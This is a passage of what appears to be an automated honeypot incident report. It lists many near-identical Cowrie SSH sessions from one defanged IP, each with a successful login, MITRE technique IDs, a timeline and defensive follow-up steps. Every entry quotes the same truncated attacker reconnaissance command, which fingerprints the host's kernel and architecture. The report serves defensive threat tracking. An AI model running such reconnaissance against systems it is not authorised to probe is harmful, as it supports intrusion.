| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:58:07` | `cowrie.session.connect` |
| `2026-09-06 04:58:07` | `cowrie.client.version` |
| `2026-09-06 04:58:08` | `cowrie.client.kex` |
| `2026-09-06 04:58:09` | `cowrie.login.success` |
| `2026-09-06 04:58:09` | `cowrie.session.params` |
| `2026-09-06 04:58:09` | `cowrie.command.input` |
| `2026-09-06 04:58:10` | `cowrie.log.closed` |
| `2026-09-06 04:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2758ff323994

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:00 |
| **Last Seen** | 2026-09-06 05:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:00:07` | `cowrie.session.connect` |
| `2026-09-06 05:00:07` | `cowrie.client.version` |
| `2026-09-06 05:00:07` | `cowrie.client.kex` |
| `2026-09-06 05:00:07` | `cowrie.login.success` |
| `2026-09-06 05:00:09` | `cowrie.session.params` |
| `2026-09-06 05:00:09` | `cowrie.command.input` |
| `2026-09-06 05:00:09` | `cowrie.log.closed` |
| `2026-09-06 05:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c446811d31e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:02 |
| **Last Seen** | 2026-09-06 05:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:02:15` | `cowrie.session.connect` |
| `2026-09-06 05:02:15` | `cowrie.client.version` |
| `2026-09-06 05:02:15` | `cowrie.client.kex` |
| `2026-09-06 05:02:16` | `cowrie.login.success` |
| `2026-09-06 05:02:17` | `cowrie.session.params` |
| `2026-09-06 05:02:17` | `cowrie.command.input` |
| `2026-09-06 05:02:17` | `cowrie.log.closed` |
| `2026-09-06 05:02:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f273d72d9e34

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:04 |
| **Last Seen** | 2026-09-06 05:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:04:09` | `cowrie.session.connect` |
| `2026-09-06 05:04:09` | `cowrie.client.version` |
| `2026-09-06 05:04:09` | `cowrie.client.kex` |
| `2026-09-06 05:04:11` | `cowrie.login.success` |
| `2026-09-06 05:04:13` | `cowrie.session.params` |
| `2026-09-06 05:04:13` | `cowrie.command.input` |
| `2026-09-06 05:04:14` | `cowrie.log.closed` |
| `2026-09-06 05:04:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df65d3fc9eb7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:05 |
| **Last Seen** | 2026-09-06 05:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:05:55` | `cowrie.session.connect` |
| `2026-09-06 05:05:55` | `cowrie.client.version` |
| `2026-09-06 05:05:55` | `cowrie.client.kex` |
| `2026-09-06 05:05:57` | `cowrie.login.success` |
| `2026-09-06 05:05:58` | `cowrie.session.params` |
| `2026-09-06 05:05:58` | `cowrie.command.input` |
| `2026-09-06 05:05:59` | `cowrie.log.closed` |
| `2026-09-06 05:05:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c75d1106be3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:07 |
| **Last Seen** | 2026-09-06 05:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:07:43` | `cowrie.session.connect` |
| `2026-09-06 05:07:43` | `cowrie.client.version` |
| `2026-09-06 05:07:43` | `cowrie.client.kex` |
| `2026-09-06 05:07:45` | `cowrie.login.success` |
| `2026-09-06 05:07:46` | `cowrie.session.params` |
| `2026-09-06 05:07:46` | `cowrie.command.input` |
| `2026-09-06 05:07:46` | `cowrie.log.closed` |
| `2026-09-06 05:07:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-451b5006fb91

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:09 |
| **Last Seen** | 2026-09-06 05:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:09:36` | `cowrie.session.connect` |
| `2026-09-06 05:09:36` | `cowrie.client.version` |
| `2026-09-06 05:09:36` | `cowrie.client.kex` |
| `2026-09-06 05:09:37` | `cowrie.login.success` |
| `2026-09-06 05:09:38` | `cowrie.session.params` |
| `2026-09-06 05:09:38` | `cowrie.command.input` |
| `2026-09-06 05:09:39` | `cowrie.log.closed` |
| `2026-09-06 05:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4af02b450a2d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:11 |
| **Last Seen** | 2026-09-06 05:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:11:28` | `cowrie.session.connect` |
| `2026-09-06 05:11:28` | `cowrie.client.version` |
| `2026-09-06 05:11:29` | `cowrie.client.kex` |
| `2026-09-06 05:11:29` | `cowrie.login.success` |
| `2026-09-06 05:11:31` | `cowrie.session.params` |
| `2026-09-06 05:11:31` | `cowrie.command.input` |
| `2026-09-06 05:11:31` | `cowrie.log.closed` |
| `2026-09-06 05:11:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3762efe7b9c8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:13 |
| **Last Seen** | 2026-09-06 05:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:13:21` | `cowrie.session.connect` |
| `2026-09-06 05:13:21` | `cowrie.client.version` |
| `2026-09-06 05:13:21` | `cowrie.client.kex` |
| `2026-09-06 05:13:22` | `cowrie.login.success` |
| `2026-09-06 05:13:23` | `cowrie.session.params` |
| `2026-09-06 05:13:23` | `cowrie.command.input` |
| `2026-09-06 05:13:23` | `cowrie.log.closed` |
| `2026-09-06 05:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc73607c4695

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:15 |
| **Last Seen** | 2026-09-06 05:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:15:23` | `cowrie.session.connect` |
| `2026-09-06 05:15:23` | `cowrie.client.version` |
| `2026-09-06 05:15:23` | `cowrie.client.kex` |
| `2026-09-06 05:15:23` | `cowrie.login.success` |
| `2026-09-06 05:15:25` | `cowrie.session.params` |
| `2026-09-06 05:15:25` | `cowrie.command.input` |
| `2026-09-06 05:15:25` | `cowrie.log.closed` |
| `2026-09-06 05:15:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-397f403ad16b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:17 |
| **Last Seen** | 2026-09-06 05:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:17:28` | `cowrie.session.connect` |
| `2026-09-06 05:17:28` | `cowrie.client.version` |
| `2026-09-06 05:17:28` | `cowrie.client.kex` |
| `2026-09-06 05:17:29` | `cowrie.login.success` |
| `2026-09-06 05:17:30` | `cowrie.session.params` |
| `2026-09-06 05:17:30` | `cowrie.command.input` |
| `2026-09-06 05:17:30` | `cowrie.log.closed` |
| `2026-09-06 05:17:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55917aaeda1d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:19 |
| **Last Seen** | 2026-09-06 05:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:19:19` | `cowrie.session.connect` |
| `2026-09-06 05:19:20` | `cowrie.client.version` |
| `2026-09-06 05:19:20` | `cowrie.client.kex` |
| `2026-09-06 05:19:21` | `cowrie.login.success` |
| `2026-09-06 05:19:22` | `cowrie.session.params` |
| `2026-09-06 05:19:22` | `cowrie.command.input` |
| `2026-09-06 05:19:22` | `cowrie.log.closed` |
| `2026-09-06 05:19:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea8c074f356d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:21 |
| **Last Seen** | 2026-09-06 05:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:21:07` | `cowrie.session.connect` |
| `2026-09-06 05:21:07` | `cowrie.client.version` |
| `2026-09-06 05:21:07` | `cowrie.client.kex` |
| `2026-09-06 05:21:08` | `cowrie.login.success` |
| `2026-09-06 05:21:10` | `cowrie.session.params` |
| `2026-09-06 05:21:10` | `cowrie.command.input` |
| `2026-09-06 05:21:10` | `cowrie.log.closed` |
| `2026-09-06 05:21:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fe8a7d3043e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:22 |
| **Last Seen** | 2026-09-06 05:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:22:52` | `cowrie.session.connect` |
| `2026-09-06 05:22:52` | `cowrie.client.version` |
| `2026-09-06 05:22:52` | `cowrie.client.kex` |
| `2026-09-06 05:22:54` | `cowrie.login.success` |
| `2026-09-06 05:22:56` | `cowrie.session.params` |
| `2026-09-06 05:22:56` | `cowrie.command.input` |
| `2026-09-06 05:22:56` | `cowrie.log.closed` |
| `2026-09-06 05:22:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ecb43dc86e5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:24 |
| **Last Seen** | 2026-09-06 05:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:24:37` | `cowrie.session.connect` |
| `2026-09-06 05:24:37` | `cowrie.client.version` |
| `2026-09-06 05:24:38` | `cowrie.client.kex` |
| `2026-09-06 05:24:39` | `cowrie.login.success` |
| `2026-09-06 05:24:41` | `cowrie.session.params` |
| `2026-09-06 05:24:41` | `cowrie.command.input` |
| `2026-09-06 05:24:42` | `cowrie.log.closed` |
| `2026-09-06 05:24:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b61ed4ba01ff

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:26 |
| **Last Seen** | 2026-09-06 05:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:26:21` | `cowrie.session.connect` |
| `2026-09-06 05:26:22` | `cowrie.client.version` |
| `2026-09-06 05:26:22` | `cowrie.client.kex` |
| `2026-09-06 05:26:23` | `cowrie.login.success` |
| `2026-09-06 05:26:25` | `cowrie.session.params` |
| `2026-09-06 05:26:25` | `cowrie.command.input` |
| `2026-09-06 05:26:25` | `cowrie.log.closed` |
| `2026-09-06 05:26:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1ad105c7797

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:28 |
| **Last Seen** | 2026-09-06 05:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:28:08` | `cowrie.session.connect` |
| `2026-09-06 05:28:08` | `cowrie.client.version` |
| `2026-09-06 05:28:08` | `cowrie.client.kex` |
| `2026-09-06 05:28:10` | `cowrie.login.success` |
| `2026-09-06 05:28:11` | `cowrie.session.params` |
| `2026-09-06 05:28:11` | `cowrie.command.input` |
| `2026-09-06 05:28:11` | `cowrie.log.closed` |
| `2026-09-06 05:28:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

